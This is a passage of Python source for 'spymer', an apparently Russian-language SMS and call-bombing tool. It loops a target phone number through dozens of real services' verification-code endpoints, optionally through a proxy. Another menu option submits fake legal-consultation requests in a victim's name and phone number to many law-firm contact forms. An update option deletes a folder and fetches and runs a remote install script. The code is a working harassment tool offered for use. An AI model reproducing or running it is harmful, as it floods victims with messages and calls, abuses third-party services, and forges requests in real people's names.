											_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
											_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
											_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
											_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
											_phone = phone
											_email = _name+f'{iteration}'+'@gmail.com'
											email = _email
											info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
											os.system('cls' if os.name=='nt' else 'clear')
											print(logo)
											print(info)
											if _phone[0] == '9':
												_phone = '7'+_phone
											if proxy=="localhost":
												proxies=None
											else:
												proxies="{'"+ssl+"':'"+ip+"'}"
											while iteration < count:
												try:
													try:
														requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
													except:
														pass
													try:
														requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
													except:
														pass
														
													iteration += 1
													print(('{} круг.').format(iteration))
												except KeyboardInterrupt:
													info = Fore.RED+"\nСпамер остановлен.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
													main()
												except:
													pass
											info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
								except:
									info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL


						except:
							info = Fore.RED+"\nНекорректно введен номер телефона!"+Style.RESET_ALL
					except KeyboardInterrupt:
						info = Fore.RED+"\nОтменено!"+Style.RESET_ALL
					except:
						info = Fore.RED+"\nНекорректный ввод данных!"+Style.RESET_ALL
			


			elif input1 == "2":
				print ("Введите номер:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if phone[0] == '+':
					phone = phone[1:]
				if phone[0] == '8':
					phone = '7'+phone[1:]
				if phone[0] == '9':
					phone = '7'+phone
				try:
					if int(phone):
						id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nPhone {} is allready in antispam list.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							requests.post('https://rainbow-t-shirt.com/spymer/ajax.php', data={'phone': phone})
							info = Fore.GREEN+"\nТелефон {} добавлен в антиспам лист.".format(phone)+Style.RESET_ALL
							
				except:
					info = Fore.RED+"\nНекорректно введен телефон!".format(phone)+Style.RESET_ALL
			
			elif input1 == "3":
				print ("Войдите в телефон для проверки:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if phone[0] == '+':
					phone = phone[1:]
				if phone[0] == '8':
					phone = '7'+phone[1:]
				if phone[0] == '9':
					phone = '7'+phone
				try:
					if int(phone):
						id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nТелефон {} находится в антиспам листе.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							info = Fore.RED+"\nТелефон {} не находится в антиспам листе.".format(phone)+Style.RESET_ALL
				except:
					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
			
			elif input1 == "4":
				try:
					print("Введите  номер:")
					phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					try:
						if int(phone):
							print("Введите имя:")
							name = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
							if name == "":
								info = Fore.RED+"\nIncorrect name entered!"+Style.RESET_ALL
								main()
							print("Введите жалобу (обращение, которое потерпевший якобы адресует адвокатам):")
							text = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
							if text == "":
								info = Fore.RED+"\nНекорректно введена жалоба!"+Style.RESET_ALL
								main()
							try:
								_phone=phone
								_text=text
								_name=name
								if _phone[0] == '+':
									_phone = _phone[1:]
								if _phone[0] == '8':
									_phone = '7'+_phone[1:]
								if _phone[0] == '9':
									_phone = '7'+_phone
								id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': _phone}).json()["id"]
								if int(id) > 0:
									info = Fore.RED+"\nТелефон находится в антиспам листе."+Style.RESET_ALL
									main()
								elif int(id)==0:
									_email = ''
									for x in range(12):
										_email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
									_phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (999) 666-99-33'
									_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(777)777-77-77'
									
									info="Телефон: {}\nИмя: {}\nЖалоба: {}\nСпамер запущен.\nДля отмены нажмите Ctrl+C".format(phone, name, text)
									os.system('cls' if os.name=='nt' else 'clear')
									print(logo)
									print(info)
									proxies=None
									try:
										try:
											vodaonline = requests.post('https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php', data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline}, proxies=proxies)
											if vodaonline.status_code == 200:
												print(Fore.GREEN + 'www.vodaonline.ru: sent')
											else:
												print(Fore.RED + 'www.vodaonline.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											yurmoscow = requests.post('https://yur-moscow.ru/ajax_call_me.php', data={'param1': _phone, 'param3': _text, 'param2': _name}, proxies=proxies)
											if yurmoscow.status_code == 200:
												print(Fore.GREEN + 'yur-moscow.ru: sent')
											else:
												print(Fore.RED + 'yur-moscow.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Москва','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'}, proxies=proxies)
											if bukvaprava.status_code == 200:
												print(Fore.GREEN + 'bukvaprava.ru: sent')
											else:
												print(Fore.RED + 'bukvaprava.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											yuristonline = requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': _text,'name': _name,'phone': _phone,'email':'','partner_id':'13'}, proxies=proxies)
											if yuristonline.status_code == 200:
												print(Fore.GREEN + 'www.yurist-online.net: sent')
											else:
												print(Fore.RED + 'www.yurist-online.net: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':_phoneVodaonline}, proxies=proxies)
											if blablabla.status_code == 200:
												print(Fore.GREEN + 'юрист-авгрупп.рф: sent')
											else:
												print(Fore.RED + 'юрист-авгрупп.рф: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''}, proxies=proxies)
											if nicecream.status_code == 200:
												print(Fore.GREEN + 'nice-cream.ru: sent')
											else:
												print(Fore.RED + 'nice-cream.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'}, proxies=proxies)
											if rossovet.status_code == 200:
												print(Fore.GREEN + 'rossovet.ru: sent')
											else:
												print(Fore.RED + 'rossovet.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											yuridkons = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text}, proxies=proxies)
											if yuridkons.status_code == 200:
												print(Fore.GREEN + 'yuridicheskaya-konsultaciya.com: sent')
											else:
												print(Fore.RED + 'yuridicheskaya-konsultaciya.com: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'}, proxies=proxies)
											if epleads.status_code == 200:
												print(Fore.GREEN + 'epleads.ru: sent')
											else:
												print(Fore.RED + 'epleads.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											pravonedv = requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': _email+'@mail.ru','phone': _phoneVodaonline,'location': 'Москва, Россия','name': _name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'}, proxies=proxies)
											if pravonedv.status_code == 200:
												print(Fore.GREEN + 'pravonedv.ru: sent')
											else:
												print(Fore.RED + 'pravonedv.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': _name,'tel-231': _phone,'textarea-472': _text,'hidden-278': 'Главная'}, proxies=proxies)
											if rdftgbhnj.status_code == 200:
												print(Fore.GREEN + 'гос-юристы.рф: sent')
											else:
												print(Fore.RED + 'гос-юристы.рф: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											gurist = requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback', data={'_wpcf7': '3591','_wpcf7_version': '5.0','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f3591-o1','_wpcf7_container_post': '0','your-name': _name,'tel-147': _text}, proxies=proxies)
											if gurist.status_code == 200:
												print(Fore.GREEN + 'gurist.ru: sent')
											else:
												print(Fore.RED + 'gurist.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											beeline = requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/', data={'leadName':'PodborSim','phone':_phone[1:11],'region':'98140'}, proxies=proxies)
											if beeline.status_code == 200:
												print(Fore.GREEN + 'moskva.beeline.ru: sent')
											else:
												print(Fore.RED + 'moskva.beeline.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											advokatmakeev = requests.post('https://advokatmakeev.ru/form.php', data={'oname': _name,'otel': _phoneVodaonline,'omail': '','omess': _text,'otype': '1'}, proxies=proxies)
											if advokatmakeev.status_code == 200:
												print(Fore.GREEN + 'advokatmakeev.ru: sent')
											else:
												print(Fore.RED + 'advokatmakeev.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											mkamsk = requests.post('http://mkamsk.ru/apply_auto_form', data={'Form[9]': _name,'Form[12]': _phone,'Form[11]': _text,'url': 'http://mkamsk.ru/','check': 'check'}, proxies=proxies)
											if mkamsk.status_code == 200:
												print(Fore.GREEN + 'mkamsk.ru: sent')
											else:
												print(Fore.RED + 'mkamsk.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											usachev = requests.post('https://usachev.vip/wp-admin/admin-ajax.php', data={'action': 'bazz_widget_action','phone': '+'+_phone,'name': ''}, proxies=proxies)
											if usachev.status_code == 200:
												print(Fore.GREEN + 'usachev.vip: sent')
											else:
												print(Fore.RED + 'usachev.vip: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											pravosfera = requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'c_name': _name, 'c_tel' : _phoneVodaonline, 'quest': _text, 'uest_go': 'Задать вопрос'}, proxies=proxies)
											if usachev.status_code == 200:
												print(Fore.GREEN + 'pravo-sfera.ru: sent')
											else:
												print(Fore.RED + 'pravo-sfera.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Заказ обратного звонка'}, proxies=proxies)
											if uristexpert24.status_code == 200:
												print(Fore.GREEN + 'urist-expert24.ru: sent')
											else:
												print(Fore.RED + 'urist-expert24.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											lawdivorce = requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': _text,'name': _name,'telephone': '+'+_phoneBukvaprava,'city': 'Москва'}, proxies=proxies)
											if lawdivorce.status_code == 200:
												print(Fore.GREEN + 'law-divorce.ru: sent')
											else:
												print(Fore.RED + 'law-divorce.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											gosurist = requests.post('http://www.gos-urist.ru/send.php', {'name': _name, 'code': _phone[1:4], 'phone': _phone[4:11], 'issue': _text}, proxies=proxies)
											if gosurist.status_code == 200:
												print(Fore.GREEN + 'www.gos-urist.ru: sent')
											else:
												print(Fore.RED + 'www.gos-urist.ruчё: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											ur9911030 = requests.post('http://9911030.ru/orderform.php', {'name': _name, 'phone': _phone, 'message': _text}, proxies=proxies)
											if ur9911030.status_code == 200:
												print(Fore.GREEN + '9911030.ru: sent')
											else:
												print(Fore.RED + '9911030.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										try:
											findclone = requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone}, proxies=proxies)
											if ur9911030.status_code == 200:
												print(Fore.GREEN + 'findclone.ru: sent')
											else:
												print(Fore.RED + 'findclone.ru: not sent')
										except:
											print(Fore.RED + 'SERVICE DIED')
										print(Style.RESET_ALL)
									except KeyboardInterrupt:
										info = Fore.RED+"\nОтменено."+Style.RESET_ALL
										main()
									except:
										pass
									info = Fore.BLUE+"\nГотово."+Style.RESET_ALL
									print(Fore.BLUE+"Готово."+Style.RESET_ALL)
									time.sleep(5)
							except:
								info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
					
					except:
						info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
				except KeyboardInterrupt:
					info = Fore.RED+"\nОтменено!"+Style.RESET_ALL
				except:
					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
			
			elif input1 == "5":
				try:
					print ("Введите http(s)://IP:port proxy.")
					print ("Пример: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
					print ("Для отмены нажмите Ctrl+C")
					proxy = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					if proxy[:5]=="https":
						ssl="https"
						ip=proxy[8:]
						
					elif proxy[:5]=="http:":
						ssl="http"
						ip=proxy[7:]

					
				except KeyboardInterrupt:
					info = Fore.RED+"\nОтменено."+Style.RESET_ALL
					
				except:
					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
					proxy = "localhost"
			
			elif input1 == "6":
				a=input("Вы уверены, что хотите обновить? (y/n) ")
				if a=="y":
					cmd = os.system("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")
					exit()
				else:
					print("Отменено")
			
			elif input1 == "7":
				print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
				exit()
	main()
Main()
